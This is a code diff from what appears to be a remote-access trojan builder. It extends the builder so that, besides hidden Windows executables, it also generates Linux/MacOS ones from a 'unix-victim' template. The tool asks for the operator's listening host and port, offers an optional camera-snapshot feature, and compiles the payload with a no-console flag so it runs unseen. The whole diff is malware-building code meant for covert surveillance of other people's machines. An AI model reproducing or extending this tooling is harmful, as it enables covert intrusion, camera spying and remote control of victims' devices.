@@ -73,21 +73,23 @@ def tmp_generate(filename, host, port):
     f.close()
 
 
-def payload_generate():
+def execute_generate(platform):
     try:
-        s = subprocess.Popen("pyinstaller -F tmp.py --noconsole", shell=True, stdout=subprocess.PIPE).wait()
-        # Check the src directory
-        if not os.path.exists("docker-pyinstaller/src"):
-            os.mkdir("./docker-pyinstaller/src/")
-        # Move the generate tmp file to the docker environment
-        subprocess.Popen("mv tmp.spec ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
-        subprocess.Popen("mv tmp.py ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
-        os.chdir("docker-pyinstaller/src")
-        # Generate the requirements file
-        subprocess.Popen("pipreqs ./ --force", shell=True, stdout=subprocess.PIPE).wait()
-        subprocess.Popen("docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows", shell=True, stdout=subprocess.PIPE).wait()
-        print(bcolors.GREEN + "Sucess generate! The exe file path is ./docker-pyinstaller/src/dist/windows. "
-              "You can change file name by yourself." + bcolors.ENDC)
+        subprocess.Popen("pyinstaller -F tmp.py --noconsole", shell=True, stdout=subprocess.PIPE).wait()
+        if platform == "win":
+            # Check the src directory
+            if not os.path.exists("docker-pyinstaller/src"):
+                os.mkdir("./docker-pyinstaller/src/")
+            # Move the generate tmp file to the docker environment
+            subprocess.Popen("mv tmp.spec ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
+            subprocess.Popen("mv tmp.py ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
+            os.chdir("docker-pyinstaller/src")
+            # Generate the requirements file
+            subprocess.Popen("pipreqs ./ --force", shell=True, stdout=subprocess.PIPE).wait()
+            subprocess.Popen("docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows", shell=True, stdout=subprocess.PIPE).wait()
+            print(bcolors.GREEN + "Sucess generate! The exe file path is ./docker-pyinstaller/src/dist/windows/tmp " + bcolors.ENDC)
+        else:
+            print(bcolors.GREEN + "Sucess generate! The exe file path is ./dist/tmp " + bcolors.ENDC)
     except:
         print(bcolors.RED + "[-] Error. Maybe you are missing some dependencies. "
               "Please check if you have install pyinstaller, docker, or pipreqs."
@@ -98,22 +100,22 @@ def generate_script():
     menu = "=========================================================\n"
     menu += "Choose the platform you want to run        \n"
     menu += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate script running on Windows\n"
-    # menu += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script running on Unix-Like system\n"
+    menu += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script running on Linux/MacOS system\n"
     menu += "========================================================\n"
     print(menu)
     sel = input("> Select Option: ")
+    while True:
+        host = input("Please input your listening host: ")
+        port = input("Please input your listening port: ")
+        confirm = input(f"Your listening host: {host}, port: {port}, (y/n)")
+        if confirm.lower() == "y":
+            break
+        else:
+            continue
     if sel == '0':
         while True:
-            host = input("Please input your listening host: ")
-            port = input("Please input your listening port: ")
-            confirm = input(f"Your listening host: {host}, port: {port}, (y/n)")
-            if confirm.lower() == "y":
-                break
-            else:
-                continue
-        while True:
             option = bcolors.BOLD + "\nGenerate with camera function will make the " \
-                                    "exe filesize increase to about 50M \n\n" + bcolors.ENDC
+                                    "filesize increase to about 50M \n\n" + bcolors.ENDC
             option += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate script with camera snapshot function\n"
             option += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script without camera snapshot function\n"
             print(option)
@@ -129,7 +131,10 @@ def generate_script():
                 time.sleep(0.5)
                 continue
         # Start generate
-        payload_generate()
+        execute_generate("win")
+    elif sel == "1":
+        tmp_generate("Module/unix-victim.py", host, port)
+        execute_generate("unix")
     else:
         print(bcolors.RED + "Invalid choice" + bcolors.ENDC)
         time.sleep(0.5)
